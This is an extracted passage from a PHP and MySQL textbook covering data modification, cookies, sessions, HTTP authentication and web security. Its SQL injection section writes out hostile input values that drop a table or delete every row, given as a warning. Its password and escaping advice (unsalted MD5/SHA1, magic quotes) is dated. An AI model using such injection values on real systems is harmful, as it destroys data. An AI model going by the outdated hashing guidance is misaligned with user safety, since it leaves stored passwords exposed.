 infor-mation. To add a purchase to your new
  purchases
  table, you’ll use an
  INSERT
  
 state-ment in your query. Example 13-3 shows how this is done. Go ahead and run 
 Example 13-1 again so you have a table in which to insert the data.
  
 Example 13-3. Using a predefined INSERT statement in insert.php
  
 <?php 
  
 require_once('db_login.php'); 
  
 require_once('DB.php'); 
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database""); if 
 (DB::isError($connection)){
  
  
  die (""Could not connect to the database: <br />"". DB::errorMessage($connection)); } 
  
 $query = ""
 INSERT INTO purchases VALUES (NULL,'mdavis',2,NULL)
 ""; 
  
 $result = $connection->query($query); 
  
 if (DB::isError($result)){
  
  
  die(""Could not query the database: <br />"". $query."" "".DB::errorMessage($result)); } 
  
 echo ""Inserted successfully!""; 
  
 $connection->disconnect( ); 
  
 ?>
  
 When you call up
  insert.php
  in your browser, you get the following:
  
 Inserted successfully!
  
 Figure 13-3 shows that the new row made it into the database by selecting all rows 
 from
  purchases
 .
  
 266
  
 |
  
 Chapter 13: Modifying MySQL Objects and PHP Data",NA
Displaying Results with Embedded Links,"You may want to give your web user the ability to click a hyperlink to launch an 
 action that relates to the current row in the results from a query. You do this by 
 add-ing URL links to the results of a query when they display on the screen. The 
 links contain a unique identifier to the row and the script that handles the action.
  
 The PHP script that’s the target of the link typically queries the database based on 
 the unique identifier that was passed to it. The types of action you can do range 
 from formatting or deleting a row to expanding on details from a related table, such 
 as authors for book titles.
  
 In Example 13-4, let’s display the list of titles with hyperlinks to purchase the titles.
  
 Example 13-4. Using embedded links to provide a purchase button in 
  
 pear_purchase_example.php
  
 <?php 
  
 require_once('db_login.php'); 
  
 require_once('DB.php'); 
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database""); if 
 (DB::isError($connection)){
  
  
  die (""Could not connect to the database: <br />"". DB::errorMessage($connection)); } 
  
 $query = ""SELECT * FROM books""; 
  
 $result = $connection->query($query); 
  
 if (DB::isError($result)){
  
  
  die(""Could not query the database: <br />"". $query."" "".DB::errorMessage($result)); } 
  
 echo '<table border=""1"">'; 
  
 echo ""<tr><th>Title</th><th>Pages</th><th>Buy</th></tr>""; 
  
 while ($result_row = $result->fetchRow(DB_FETCHMODE_ASSOC)) {
  
  
  echo ""<tr><td>"";
  
  
  echo $result_row[""title""] . '</td><td>';
  
  
  echo $result_row[""pages""] . '</td><td>';
  
  
  echo '<a href=""purchase.php?title_id='.$result_row[""title_id""].'"">Click 
  
 to purchase</a></td></tr>'; 
  
 }
  
 Displaying Results with Embedded Links
  
 | 267",NA
Presenting a Form to Add and Process in One File,"We’re building a form that allows a web user to add a title to the
  books
  table. 
 Example 13-6 is a slightly longer example because we display and process the form 
 in one file, but it should look familiar to you since we’re simply combining several 
 steps that we’ve done separately before.
  
 Example 13-6. Using input from a form to add a title
  
 <?php 
  
 // Define a function to perform the database insert and display the titles function 
 insert_db($title, $pages){
  
  
  require_once('db_login.php');
  
  
  require_once('DB.php');
  
  
  $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database"");
  
  if 
 (DB::isError($connection)){
  
  
  
  die (""Could not connect to the database: <br />"". DB::errorMessage($connection));
  
  }
  
  if (get_magic_quotes_gpc( )) {  //guard against SQL injection
  
  
  $title = stripslashes($title);
  
  
  $pages = stripslashes($pages);
  
  }
  
 270
  
 |
  
 Chapter 13: Modifying MySQL Objects and PHP Data",NA
SQL Injection,"You must take several precautions when working with strings submitted from a 
 form that will be processed by the database. Specifically, you need to be on guard 
 for a tactic called
  SQL injection
 . SQL injection is when a malicious user enters 
 another SQL query into a field such as:
  
  1,1);drop table users;
  
 If that field is added to this query:
  
 $query = ""INSERT INTO books VALUES (NULL,$title,$pages)"";
  
 here’s what could happen:
  
 INSERT INTO books VALUES (NULL,1,1);drop table users; ,$pages)"";
  
 PHP and MySQL work together to thwart this kind of attack. What happens is the 
 MySQL query command allows only one statement per query. So, attempting to 
 start a new query after the first one has already been started generates an error.
  
 Here’s another type of attack:
  
 $query = ""DELETE FROM books where title_id = '$title_id'"";
  
 If the user specifies a malicious value of
  ""'1 OR ''1''=''1'""
  for
  $title_id
 , here’s what could 
 happen:
  
 DELETE FROM books where title_id = 1 OR '1'='1'
  
 This deletes all books instead of one.
  
 PHP uses a system by default called
  magic quotes
  with user input. Magic quotes 
 auto-matically escape any special characters with a backslash (
 \
 ), including single 
 and double quotes. Unfortunately, magic quotes don’t provide enough protection to 
 be safe. Example 13-7 shows how to test whether magic quotes are enabled on your 
 installation of PHP.
  
 Example 13-7. Checking for magic quotes
  
 <?php 
  
 if (get_magic_quotes_gpc( )) {
  
  
  echo ""Magic quotes are enabled.""; 
  
 } else {
  
  
  echo ""Magic quotes are disabled.""; 
  
 }
  
  
  ?>
  
 The script should return the following:
  
 Magic quotes are enabled.
  
 However, it’s better to use the MySQL-specific escape function, which is
  mysql_real_ 
 escape_string( )
 , as shown in Example 13-8.
  
 Presenting a Form to Add and Process in One File
  
 | 273",NA
Cross-Site Scripting Attacks,"Another major gotcha to look out for when using data from user input is the risk of 
 cross-site scripting attacks
 . These attacks work slightly differently from SQL injec-
 tion. They don’t compromise the data on your server, but instead can lead to a 
 user’s browser giving out sensitive data to a third party because the browser thinks 
 the command came from your trusted site. To guard against these attacks, you 
 should pass any strings that came from a user through the
  htmlentities
  function. It 
 takes the format of:
  
 htmlentities(
 string_to_clean
 )
  
 For example:
  
 print ""The title of the book is: "" . htmlentities($_POST['title']);
  
 Here’s an example of what
  htmlentities
  does to the string:
  
 <?php 
  
 $sample = ""A sample is <i>italics</i>""; 
  
 echo htmlentities($sample); 
  
 ?>
  
 When executed, this returns the HTML markup, as seen from the View Source option 
 of your web browser:
  
 A sample is &lt;i&gt;italics&lt;/i&gt;
  
 The browser displays this as:
  
 A sample is <I>italics</I>
  
 274
  
 |
  
 Chapter 13: Modifying MySQL Objects and PHP Data",NA
Updating Data,"Since you’ve been inputting table data, you can also change existing records. You’ll 
 probably do this only if there are errors in your data, or in the instance that user 
 data has changed and needs to be updated in the database. Updates are handled as 
 shown in Example 13-9.
  
 Example 13-9. Updating a field
  
 <?php 
  
 require_once('db_login.php'); 
  
 require_once('DB.php'); 
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database""); if 
 (DB::isError($connection)){
  
  
  die (""Could not connect to the database: <br />"". DB::errorMessage($connection)); } 
  
 $query = ""UPDATE books SET pages=558 WHERE title_id=2""; 
  
 $result = $connection->query($query); 
  
 if (DB::isError($result)){
  
  
  die(""Could not query the database: <br />"".$query."" "".DB::errorMessage($result)); } 
  
 echo ""Updated successfully!""; 
  
 $connection->disconnect( ); 
  
 ?>
  
 If you have multiple columns to edit in one record at a single time, you’d separate 
 the code with a comma (
 ,
 ). Again, you could’ve used a dynamic value such as a form 
 input in the
  WHERE
  clause. If you use a
  WHERE
  clause, you’d have to specify which 
 rows the update affects; otherwise, the change applies to every row.
  
 Updates and deletions are two of most important reasons to use a primary key. The 
 primary key number, which never should change, can be a point of reference in the 
 WHERE
  clause. In Figure 13-9, you see the new value in the
  books
  table from the
  
 mysql 
 client.
  
 As a precaution against accidentally updating too many rows, apply a
  limit
  clause 
 with your update. Next, we’ll discuss how to intentionally delete data.
  
  
  
 Never update a primary key column. This value should never 
 change. If you change a primary key in one table, it could affect the 
 data in another table.
  
 27
 6
  
 |
  
 Chapter 13: Modifying MySQL Objects and PHP Data",NA
Deleting Data,"Use the
  DELETE
  command to completely remove existing data from the database. 
 Remember, though, that once you’ve deleted data, it can no longer be retrieved; it’s 
 permanently gone. Make sure you have appropriate checks and balances in place 
 for the deletion of existing data. Use the
  WHERE
  command so that you don’t delete 
 data from all the rows in your table.
  
 The command
  TRUNCATE TABLE
  tablename
  deletes an entire table, which means the 
 table structure and the records, and then it recreates the structure. Technically, 
 your final result is the same, but our example is a safer way to perform a delete. The 
 advantage of
  TRUNCATE
  is that it’s much faster for deleting large tables.
  
  
 While it’s great to be able to
  DROP
  and
  TRUNCATE
  tables from PHP, 
 you probably don’t want to leave this capability anywhere on your 
 web site for an average user.
  
 There is a way to safeguard against erroneous selections by running the query 
 using 
 SELECT
  instead of
  DELETE
  with the same
  WHERE
  clause. Deleting data from a 
 MySQL database through PHP works similarly to any of the other queries. If you do 
 this, query results display which row or rows are going to be affected by your 
 deletion. Let’s modify the example to provide a link that deletes the current row. In 
 Example 13-10, you’ll delete a purchase.
  
 Example 13-10. Providing a link to delete a purchase in deletion_link.php
  
 <?php 
  
 require_once('db_login.php'); 
  
 require_once('DB.php'); 
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database""); if 
 (DB::isError($connection)){
  
  
  die (""Could not connect to the database: <br />"". DB::errorMessage($connection)); }
  
 Deleting Data
  
 | 277",NA
Generating Unique Identifiers,"In our examples so far, we always let MySQL pick the primary key when doing 
 inserts by sending
  NULL
  in the
  key
  field. The downside of this is that you don’t know 
 which key value MySQL assigned your row. If you add a book and then an author, 
 how do you know what the foreign key value is for the book to add in the
  authors 
 table? Well, you can use the
  mysql_insert_id( )
  command to get the last auto-assigned 
 primary key from an
  AUTO_INCREMENT
  column.
  
 Its syntax is:
  
 int mysql_insert_id( [resource link_identifier] )
  
 If the last query generated an auto-increment, that value is returned. Zero is 
 returned if the last query didn’t generate a key.
  FALSE
  is returned if there isn’t a 
 valid database connection.
  
 Execute
  mysql_insert_id( )
  directly after the
  INSERT
  statement to minimize the possi-
 bility of another
  INSERT
  statement being executed before you read the value. In a 
 multitasking environment, you have to be aware that other processes or users may 
 also be using the data to execute queries. Figure 13-12 shows the output of the PHP 
 code. For example, to grade the last index key used:
  
 mysql_query($query); 
  
 $last_value = mysql_insert_id( ); 
  
 echo ""The id that was created is: $last_value<br />"";
  
 PEAR DB uses its own sequence mechanism to generate unique IDs. Given an active 
 database connection, the
  nextId( )
  function returns the insertion key to use. The 
 MySQL
  mysql_insert_id( )
  function retrieves the key value after the insert, while the 
 PEAR DB
  nextId( )
  function generates a value that’s used in the insert statement.
  
 280
  
 |
  
 Chapter 13: Modifying MySQL Objects and PHP Data",NA
Performing a Subquery,"Sometimes you’ll want to display the data in a linked table as a list instead of 
 repeat-ing all of the values from the joined table. For example, when listing books, it 
 would look nicer to list authors in one cell of your table. Example 13-13 uses a 
 second query and a loop to accomplish this.
  
 Example 13-13. Displaying the authors in a list
  
 <?php 
  
 require_once('db_login.php'); 
  
 require_once('DB.php'); 
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database""); if 
 (DB::isError($connection)){
  
  
  die (""Could not connect to the database: <br />"". DB::errorMessage($connection)); } 
  
 // Display the table 
  
 $query = ""SELECT * FROM books""; 
  
 $result = $connection->query($query); 
  
 if (DB::isError($result)){
  
  
  die(""Could not query the database: <br />"".$query."" "".DB::errorMessage($result)); } 
  
 echo '<table border=""1"">'; 
  
 echo ""<tr><th>Title</th><th>Pages</th><th>Authors</th></tr>"";
  
 282
  
 |
  
 Chapter 13: Modifying MySQL Objects and PHP Data",NA
Chapter 13 Questions,"Question 13-1 
  
 Add another column to the
  books
  table called
  published_date
  that stores a date in 
 a PHP page.
  
 Question 13-2 
  
 What are the two major categories of security risks when working with user 
 input?
  
 Question 13-3 
  
 Which function tells you whether the PHP interpreter has magic quotes turned 
 on?
  
 Question 13-4 
  
 Which function prevents cross-site scripting attacks when used before display-
 ing user-supplied input?
  
 See the “Chapter 13” section in the Appendix for the answers to these questions.
  
 284
  
 |
  
 Chapter 13: Modifying MySQL Objects and PHP Data",NA
CHAPTER 14,NA,NA
"Cookies, Sessions, and Access Control","14
  
 As your applications grow more complex, you’ll need to keep better track of your 
 users. Cookies, sessions, and access control all provide an opportunity to interact 
 appropriately with specific users. Sessions allow for the persistence of data in an 
 oth-erwise stateless interaction. Without sessions, the web server sees each page 
 request without the context of other page requests and therefore cannot remember 
 data between requests.",NA
Cookies,"You can track certain user details such as the number of visits, names, or the date of 
 the last visit using
  cookies
 , small bits of text stored on the client that have been 
 avail-able since Netscape 1.0. The client machine stores this information and sends 
 it to the web server whenever there is a request. Cookies data is sent along with the 
 HTTP headers.
  
 After the first visit to any web site, the browser returns a copy of the cookie to the 
 server each time it connects. For security reasons, cookies can be read only from 
 the domain that created them. Additionally, cookies have an expiration date after 
 which they’re deleted. The maximum size of data that a cookie can hold is 4 KB.
  
 Cookies are different from sessions because cookies are stored on the client’s disk, 
 whereas a session stores the bulk of its data on the server. Sessions are basically 
 like tokens, which are generated at authentication. This means that a session is 
 available as long as the session hasn’t expired or the user hasn’t closed her browser 
 (which deletes the cookie used to track the session). Sessions use a single cookie by 
 default to track their tokens or session identifiers.
  
 Figure 14-1 illustrates where cookies are stored when a web browser requests 
 pages; 
 in 
 this 
 example,
  
 http://example.com/set.php
  
 followed 
 by
  
 http://example.com/read.php
 , you’ll see what we’re talking about. The actual key 
 storage resides on the client’s browser after the first page is requested. When the 
 client requests the second page, it also sends the cookie data to the server.
  
 285",NA
Setting a Cookie,"PHP provides an easy function to set a cookie:
  setcookie
 .
  
 Because cookies are generated as part of HTML page headers, it’s 
  
 important that you call
  setcookie
  before sending any other output.
  
  
 The function takes a name for the cookie as a parameter. You can optionally specify 
 other details; for example:
  
 setcookie (
  name
  ,
  value
  ,
  expire
  ,
  path
 ,
  domain
  ,
  secure
  )
  
 Table 14-1 lists the parameter values and their meanings for
  setcookie
 .
  
 Table 14-1. setcookie parameters
  
 Paramete
 r
  
 Meaning
  
 Example value
  
 name
  
 The name that the cookie will use for 
 storage and
  
 Username.
  
 retrieval.
  
 286
  
 |
  
 Chapter 14: Cookies, Sessions, and Access Control",NA
Accessing a Cookie,"Cookies can be accessed one of two ways. One way is that they’re accessible from 
 the
  $_COOKIE
  environmental variable with the syntax
  $_COOKIE['
 cookiename
 ']
 , as 
 demonstrated in Example 14-2.
  
 Example 14-2. Viewing the username cookie
  
 <?php 
  
 if (!isset($_COOKIE['username'])) 
  
 {
  
  
  echo (""Oops, the cookie isn't set!""); 
  
 } 
  
 else 
  
 {
  
  
  echo (""The stored username is "". $_COOKIE['username'] . "".""); 
  
 } 
  
 ?>
  
 Cookies
  
 | 287",NA
Destroying a Cookie,"Cookies can be destroyed or deleted by the client or the server. Clients can easily 
 delete their cookies by locating the
  Cookies
  folder on their system and deleting them.
  
 The server can delete the cookies by:
  
 • Resetting a cookie by specifying an expiration time
  
 • Resetting a cookie by specifying its name only
  
 In both instances, you’d use the
  setcookie
  command. To destroy a cookie by specify-
 ing the expiration time, simply call
  setcookie
  with a past expiration date, as is done 
 in Example 14-3.
  
 Example 14-3. Destroying a cookie by expiring it in the recent past
  
 <?php 
  
 //Remember that setcookie must come before any other line that generates output 
 setcookie(""username"","""", time( )-10 ); 
  
 echo 'Rosebud.'; 
  
 ?>
  
 Example 14-3 returns:
  
 Rosebud.
  
 Now if you called the code in Example 14-2 again, you’d get:
  
 Oops, the cookie isn't set!
  
 Sometimes you may want to restrict pages from being viewed by everyone. You’d do 
 this by using PHP to get authentication from the HTTP server.",NA
PHP and HTTP Authentication,"PHP can use authentication from the Apache web server. PHP sends a header 
 request to the browser requesting an authentication dialog on the client’s browser. 
 You’ll recognize this prompt as a standard browser login prompt. Because the 
 authentica-tion head must come before any other HTML output, this works only 
 with the module-based PHP installation, not the CGI version. If you followed the 
 installation instructions in Chapter 2, you installed PHP as a module, so you don’t 
 have to worry about the CGI version.
  
 288
  
 |
  
 Chapter 14: Cookies, Sessions, and Access Control",NA
Storing a Username and Password in a Database,"Let’s revisit some of the knowledge you picked up back in Chapter 5. We’re going to 
 create a new table for users. Instead of comparing a username and password to val-
 ues that are set in your PHP script, you’ll check them against a database table called
  
 290
  
 |
  
 Chapter 14: Cookies, Sessions, and Access Control",NA
Sessions,"By default, HTML and web servers don’t keep track of information that was entered 
 on a page when the client’s browser loads another page. This makes doing anything 
 that involves using the same information from a user on several pages difficult.
  
 Sessions help solve this problem by maintaining data during a user’s visit to your 
 web site from page to page. Each session can store many variables that are main-
 tained throughout that session. The server keeps track of users’ sessions by 
 assigning them a unique session ID, generated by the server, when the session 
 starts. This iden-tifier is called the
  session identifier
  and must be sent to the server 
 each time a page is requested once a session begins. Figure 14-7 illustrates the 
 interaction between the client browser and web server for a session.
  
  
 example.com 
 session_id:
  
 Client
  
 Server
  
 Session ID 
 and variables
  
 1
  
 request 
 set.php
  
 example.com/set.php
  
 request 
 page 
  
 write 
 cookie 
  
 display results
  
 request
  
 <?php 
  
 session_start();
  
 Cooki
 e 
  
 result
 s
  
 $_SESSION['test']=42; ?>
  
 2
  
 request 
 read.php
  
 Session 
 reques
 t
  
 Cookie 
 example.com/read.php
  
 ID
  
 <?php
  
 session_start();
  
 session_id:
  
 19283232 
  
 test: 42
  
 19283232
  
 read cookie 
  
 request page 
  
 display results
  
 Session ID
  
 Results
  
 echo $_SESSION['test']; ?>
  
 Variables
  
  
 Figure 14-7. A typical session stores some information on both the client and server hard disks
  
 Sessions are stored on the server. The session variables are stored in a file and are 
 serialized
 . When a variable is serialized, it’s written out to a file as its name, type, 
 and value all in a sequential string. On a Unix-based server, this file is usually 
 written out to a directory under the
  /tmp
  (temporary) filesystem.
  
 PHP doesn’t actually create a record for a session until a session vari-
  
 able has been assigned a value. That makes sense because without any
  
  
 values to manage, the session doesn’t really do anything.
  
 The browser sends the session ID to the server each time it requests a page. The 
 browser can send the session ID to the server either through a cookie or as a URL 
 parameter. The default is to use the cookie, but it’s possible for a user to turn off
  
 294
  
 |
  
 Chapter 14: Cookies, Sessions, and Access Control",NA
Using Sessions,"To start a session, place the
  session_start
  function at the beginning of your PHP 
 script before you store or access any data during in the session. The
  session_start 
 function, used in Example 14-10, needs to execute before any other
  header
  calls or 
 other output is sent to the browser; otherwise, your session may not work 
 properly.
  
 Example 14-10. Simply starting a session
  
 <?php 
  
 session_start( ); 
  
 ?>
  
 First, we’ll discuss the way variables used to be assigned to a session, since you may 
 see this in code you get off the Web. The old-school way is to use the
  session_ register
  
 function, shown in Example 14-11. This method is purely for your educa-tion; don’t 
 use this method in your code, as it will cause an error.
  
 Example 14-11. Registering a variable with session_register
  
 <?php 
  
 //DON'T USE THIS 
 APPROACH 
  
 session_start( ); 
  
 session_register(""hello""); 
  
 $hello = ""Hello World""; 
  
 ?>
  
 Once the variable is bound like this in a PHP script, any changes to the variable are 
 stored in the session. If the session isn’t already started, the
  session_register
  com-
 mand automatically starts it. Modern PHP interpreters return a warning with this 
 code:
  
 Warning: Unknown( ): Your script possibly relies on a session side-effect which existed until PHP 
 4.2.3. Please be advised that the session extension does not consider global variables as a source 
 of data, unless register_globals is enabled.
  
 You can disable this functionality and this warning by setting 
  
 session.bug_compat_42 or session.bug_compat_warn to off, respectively. in Unknown on line 0
  
 The correct way is to store and access session variables by the
  $_SESSION
  global 
 variable with the name of the variable supplied within brackets. For example,
  $_ 
 SESSION['
 variable_name
 '] =
  value
 ;
  means that the variable name is the name of the 
 session variable and
  value
  is the value. For example, to set the session variable user 
 to mdavis, you’d use the following syntax:
  $_SESSION['user']='mdavis';
 . Assigning a 
 new variable to the
  $_SESSION
  global automatically adds it to the session. The 
 session must be started before you can access the session variables.
  
 Sessions
  
 | 295",NA
Expanding Our Login Example,"Most login systems use session variables to pass useful information around without 
 having to re-retrieve it from the database. In Example 14-14 we’re checking to see 
 whether a user is valid, and then setting a few session variables.
  
 Example 14-14. Checking to see whether a user is valid
  
 <?php 
  
 session_start( ); 
  
 require_once('db_login.php'); 
  
 require_once('DB.php'); 
  
 if (empty($_SESSION['user_id'])) {
  
  
  if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW'])) {
  
  
 header('WWW-Authenticate: Basic realm=""Member Area""');
  
  
  header(""HTTP/1.0 401 Unauthorized"");
  
  
  echo ""You must enter in a username and password combination!"";
  
  
  exit; 
  
 } 
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database""); if 
 (DB::isError($connection)){
  
  
  die (""Could not connect to the database: <br />"". DB::errorMessage($connection)); } 
  
 $username = mysql_real_escape_string($_SERVER['PHP_AUTH_USER']); 
  
 $password = mysql_real_escape_string($_SERVER['PHP_AUTH_PW']); 
  
 $query = ""SELECT user_id, username FROM users WHERE 
  
 username='"".$username.""' AND password=MD5('"".$password.""') LIMIT 1""; 
  
 $result = $connection->query($query); 
  
 if(!($row = $result->fetchRow(DB_FETCHMODE_ASSOC))) {
  
  
  header('WWW-Authenticate: Basic realm=""Member Area""');
  
  
  header(""HTTP/1.0 401 Unauthorized"");
  
  
  echo ""Your username and password combination was incorrect!"";
  
  
  exit; 
  
 } 
  
 $_SESSION['user_id'] = $row['user_id']; 
  
 $_SESSION['username'] = $row['username']; 
  
 } 
  
 echo ""You have successfully logged in as "".$_SESSION[""username""]."".""; 
  
 ?>
  
 Example 14-14 displays Figure 14-9, then Figure 14-10, if you were successful.
  
 The code first checks the session to see whether the
  user_id
  session variable already 
 has a value assigned to it. Subsequent pages can check for the session variables that 
 were set at the end of Example 14-14 instead of doing another HTTP realm-based 
 authentication and verifying that against the database.
  
 If the session has the key
  user_id
 , you know the variable was set, and you can con-
 tinue without any further checking. However, email addresses and URLs are diffi-
 cult to validate with 100 percent accuracy. Obviously, you’d mandate that an email 
 address have an
  @
  symbol that is followed by some combination of letters, 
 numbers,
  
 Sessions
  
 | 297",NA
Ending a Session,"There are times when you want to end a session before the session times out. An 
 example of this is when you provide a logout button or link on your page. The 
 logout is actually done by ending the user’s session. To end a session, use the 
 session_destroy
  function. Of course, you must first start a session for it to make sense 
 to destroy it.
  
 Keep in mind that ending a session doesn’t make the values from that session 
 unavailable to the rest of the currently executing PHP page. Example 14-15 
 provides a simple script that both ends the session and makes the session values 
 unavailable to the rest of the PHP script.
  
 298
  
 |
  
 Chapter 14: Cookies, Sessions, and Access Control",NA
Using the Database to Store Sessions,"Sometimes, it may be useful to store sessions in the database instead of on the local 
 filesystem. For example, if your application is running on several servers simulta-
 neously (like in a load balanced environment), it’s possible that a user may switch 
 between servers from page to page. With local sessions, users’ session data is lost 
 when they switch between servers.
  
 PHP allows you to override the default session handling with your own functions. 
 None of your code that uses the session data needs to change, as PHP abstracts the 
 custom session handling. The function that defines how to custom process session 
 data is
  session_set_save_handler( )
 :
  
 session_set_save_handler(
 open_function
 , 
  
 close_function
 , 
  
 read_function
 , 
  
 write_function
 , 
  
 destory_function
 , 
  
 clean_function
 );
  
 You’ll need to create a table to store the session data and functions that process 
 each function from the list of parameters. The
  session_set_save_handler( )
  function 
 must be called before starting a session. Creating these functions here is beyond 
 our scope, but you should be aware that it’s an option.",NA
Using Auth_HTTP to Authenticate,"Similar to the way you use PEAR to improve and simplify database access, there’s 
 also a PEAR module called
  Auth_HTTP
  that streamlines the process of authenticating 
 users against a database table. Because the code is prewritten, it reduces the risk 
 that
  
 Using Auth_HTTP to Authenticate
  
 | 301",NA
Chapter 14 Questions,"Question 14-1 
  
  
 Where is the data for a cookie stored?
  
 Question 14-2 
  
 What function can be used to encode passwords for storage in the database so 
 that users’ plain-text passwords aren’t exploited?
  
 Question 14-3 
  
  
 Create a session and store the value
  1
  in the session variable
  user_id
 .
  
 Question 14-4 
  
  
 Display the
  user_id
  session variable created in Question 14-3.
  
 See the “Chapter 14” section in the Appendix for the answers to these questions.
  
 306
  
 |
  
 Chapter 14: Cookies, Sessions, and Access Control",NA
CHAPTER 15,NA,NA
Security,"15
  
 Once your code is working, you may be tempted to think that you’re done with it. In 
 reality, you may have some security issues that don’t affect normal usage but pro-
 vide an opening for an attack. The unfortunate reality of web-accessible 
 applications is that they’re only as secure as their weakest link. Therefore, you 
 must be conscious of security on every level, from the database to the web server 
 and the PHP process-ing itself.
  
 Although you can’t make every system truly unbreakable, you can perform the 
 equivalent of dead-bolting doors and locking windows. If you make your system 
 dif-ficult enough to compromise, it’s generally not worth a hacker’s effort, though 
 keep in mind that some may still try. We’ve had our own server locked up from 
 hackers trying to get in, and boatloads of spam that cause the server to belch and 
 stop work-ing temporarily.
  
 We’re going to reiterate some of the security concepts that we discussed while 
 learn-ing the basics of PHP and MySQL security. This reduces the risk that the web 
 sites you build will be insecure. We’ll also expand on those topics to give you some 
 more options for making hackers’ lives difficult and your life easier.",NA
Limit Access to Administrative Pages,"When installing software packages that include a control panel or setup script, you 
 should always either change the script’s directory or, in the case of setup scripts, 
 remove them after you’re done installing. These scripts can provide a way for a ran-
 dom web surfer to mess up your configuration for the package you installed. While 
 that isn’t so bad, in a worst-case scenario, it could lead to hackers uploading PHP 
 code of their choice and doing quite unpleasant things with your system. Most web-
 based packages recommend doing this in their installation instructions. Follow 
 their advice; they wrote the installation manual for a reason: for you to read it! As 
 most technical writers say, “Always published, never read.” How many people do 
 you per-sonally know who actually read their alarm clock setup, DVD player setup, 
 or manu-als for any number of electronic devices?
  
 307",NA
Including Files,"No one ever wants to recreate the wheel, so there are ways to reuse code. It 
 probably sounds like plagiarism, but in the world of open source, it’s a bonus to 
 reuse code using
  include
  files.
  
 Obviously, the ability to reuse code by using
  include
  makes your life easier by not 
 having the same blocks of code repeated over and over in your programs. It also 
 improves the maintainability of your pages because code used on multiple pages 
 need only be modified once in the PHP source file.
  
 The downside to look out for is using filenames for your included code that allows 
 the web server to return the contents of the file without its being processed by PHP. 
 This has two major security risks. First, it allows a user to see your PHP source 
 code, which could allow someone to look for weaknesses in the code and then 
 know how to easily exploit them. Second, you could expose passwords that may be 
 stored in an included file. In order to thwart these problems, make sure that you 
 always name your included file with the
  .php
  extension and not something such as
  
 .inc
  that won’t be processed if viewed directly. Keep in mind that
  include
  and
  require
  
 operate the same way except for how a missing file is handled. The
  require
  
 construct errors out and stops script execution if the file to include isn’t found. 
 However, there is a caveat when using
  include
 . If an
  include
  construct is placed in the 
 part of a conditional block that doesn’t execute, the file won’t be included.
  
 Figure 15-3 shows what can happen by simply requesting your
  db_login.php
  script if 
 it ends in an
  .inc
  extension—for example,
  http://10.0.0.1/db_login.inc
 .
  
  
 Figure 15-3. Nothing that we want the world to see!
  
 Beyond using the proper file extension, you can put your include files that have 
 sen-sitive information in a directory that’s not under the published web root. 
 Another good way is to place them in a directory that’s protected by an
  .htaccess
  
 file, at the very least. A very important part of security is the usage of passwords, 
 which we’ll cover next.
  
 310
  
 |
  
 Chapter 15: Security",NA
Storing Passwords in the Database,"In general, it’s never a good idea to store passwords for users in the database with-
 out encoding them. The principal reason for this is that if someone is able to gain 
 access to your database, even if it’s just read-only access, she can get all of your 
 users’ passwords. This allows her to log in as other users, and she could attempt to 
 use the same password on other web sites, since many users use common 
 passwords across numerous sites.
  
 We see password violation on a weekly basis. Our teenager uses instant messaging, 
 and his friends know what he likes and he knows what they like, so all the teens can 
 extrapolate someone’s password just based on their knowledge of their friends. 
 One user can log in as someone else and wreak havoc by pretending to be
  soccergrrl
 , 
 as opposed to his own login,
  randomkid
 .
  
 There are only a few downsides to encrypting passwords, including slightly 
 increased complexity and the need to change a password for a user instead of being 
 able to relay the forgotten password. One way to work around this problem is to 
 store a password hint in the database. This is something that a user can enter when 
 register-ing that will help her remember what password she used. For example, if 
 your pass-word is some variation on your dog’s name, you might use “dog” as a 
 reminder.
  
 In prior chapters, we’ve discussed only a single way to encrypt a password using 
 the 
 md5
  one-way encrypt function. There’s actually another function that can be 
 used and is more secure. It’s called
  sha1
 , which stands for
  secure hash algorithm
 . 
 Instead of returning a 128-bit string such as
  md5
 ,
  sha1
  returns a 160-bit string. The 
 added length helps make it harder to guess the original password’s value. 
 Additionally, the algorithm that’s used in
  sha1
  is more advanced than
  md5
 , making 
 it more difficult to break the code.
  
 For example, try Example 15-3 and see what you get when you run the code.
  
 Example 15-3. Comparing the output of md5 to that of sha1
  
 <?php 
  
 echo ""Encrypting <b>testing</b> using md5: "".md5(""testing""); 
  
 echo ""<br />""; 
  
 echo ""Encrypting <b>testing</b> using sha1: "".sha1(""testing""); 
  
 ?>
  
 This displays the result shown in Figure 15-4.
  
 Another risk area to watch out for is
  register_globals
 . Some of the problems are 
 specific to a PHP release, so keep in mind what version you downloaded from the 
 instructions in Chapter 2.
  
 Security
  
 | 311",NA
The Problem with Automatic Global Variables,"Sometimes making life easy for developers can cause problems. Early versions of 
 PHP (before version 4.2.0) by default allowed you to access variables for a
  GET
  or 
 POST
  operation automatically as global variables. The name of the variable came 
 from the
  GET
  or
  POST
  operation. While this was very convenient, it also created a 
 big secu-rity hole.
  
  
 The actual setting that changed its default value is called
  register_ 
 globals
 . It could be set to
  OFF
  in the
  php.ini
  configuration file. Most 
 people didn’t change the default value, though.
  
 It wasn’t really that
  register_globals
  was a terrible idea; it’s just that most people 
 didn’t properly check the source of a variable before using it. The danger was that 
 because PHP doesn’t require variables to be predefined, it’s possible for a malicious 
 user to call your PHP script with a
  GET
  or
  POST
  parameter that you aren’t anticipat-
 ing. If that variable matches the name of a variable that you’re using for something 
 important, such as indicating whether a password matches, the malicious user 
 might be able to change the functionality of your program just by adding a false 
 parameter.
  
 Unfortunately, admitting that this was a mistake and having to change the default 
 value caused some pain. Because many people assumed that they could automati-
 cally reference form-submitted values as globals, scripts that used to work now 
 don’t find values where they expect them. Code had to be rewritten, and worse yet, 
 you may still find some code that hasn’t been fixed, and therefore doesn’t work, but 
 won’t even give you an error message so you can rectify the problem.
  
  
 If you’ve just downloaded a set of PHP scripts from the Internet and 
 find that they run but essentially ignore form-inputted data, there’s a 
 good chance that they were written with the assumption that
  
 register_globals
  was on. You’ll need to either expand out the vari-
  
 ables or change the references within the scripts to the appropriate 
  
 $_GET
  or
  $_POST
  super globals.
  
 312
  
 |
  
 Chapter 15: Security",NA
Session Security,"Because a session may contain sensitive information, you need to treat the session 
 as a possible security hole. Session security is necessary to create and implement a 
